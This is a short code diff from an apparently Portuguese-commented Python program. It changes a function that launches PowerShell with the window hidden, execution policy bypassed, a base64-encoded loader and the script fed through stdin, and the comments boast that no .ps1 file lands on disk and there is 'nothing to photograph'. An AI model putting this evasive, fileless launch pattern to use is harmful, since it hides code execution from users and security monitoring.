@@ -2034,9 +2034,10 @@ _PS_CARREGADOR = ("$s = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64
 def _iniciar_powershell(script):
     """PowerShell sem janela e sem arquivo .ps1 no disco: o script vai pela
     entrada padrão (CREATE_NO_WINDOW: nenhuma janela - não há o que fotografar)."""
+    import modPowerShell
     carregador = base64.b64encode(_PS_CARREGADOR.encode("utf-16-le")).decode("ascii")
     p = subprocess.Popen(
-        ["powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
+        [modPowerShell.executavel(), "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
          "-EncodedCommand", carregador],
         stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
         env=dict(os.environ, **ambiente_powershell()),         # o segredo da execução
